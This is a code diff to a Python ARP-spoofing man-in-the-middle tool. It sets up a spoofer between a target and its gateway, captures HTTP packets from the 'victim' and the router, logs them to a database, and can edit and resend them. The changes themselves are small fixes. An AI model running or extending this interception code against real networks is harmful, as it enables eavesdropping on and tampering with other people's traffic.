@@ -14,7 +14,7 @@ def is_https(pack):
 
 
 def is_http(pack):
-    return TCP in pack and (pack[TCP].sport == 80 or pack[TCP].dport == 80)
+    return Raw in pack and TCP in pack and (pack[TCP].sport == 80 or pack[TCP].dport == 80)
 
 
 class Sniffer:
@@ -23,6 +23,7 @@ class Sniffer:
         self.spoofer = ArpSpoofer(destinationMac, targetIP, gatewayIP, sourceMAC)
         self.db = DataBase()
         self.packets = self.db.get_last()
+        self.db.start()
         self.packets_lock = Lock()
 
     def start_spoofing(self):
@@ -63,7 +64,7 @@ class Sniffer:
                 # TODO: add changes
             else:
                 return
-            sendp(packet)
+            sendp(packet, verbose=False)
 
     def edit_packet(self, packet, src_ip, dst_ip, req_type, req_params, data, src_port, dst_port, ttl):
         if src_ip != None:
@@ -113,7 +114,7 @@ class Sniffer:
         # TODO: handle this
 
     def handle_packets_from_victim(self, pack):
-        print("start h/p/v")
+        #print("start h/p/v")
         if is_http(pack):
             #self.db = DataBase()
         #try:
@@ -147,7 +148,7 @@ class Sniffer:
         self.send_packet(pack)
 
     def handle_packets_from_router(self, pack):
-        print("h/p/r")
+        #print("h/p/r")
         if is_http(pack):
             #self.db = DataBase()
             self.db.write_to_router(self.packets, pack[IP].src, pack[IP].dst, self.find_req_type(pack),
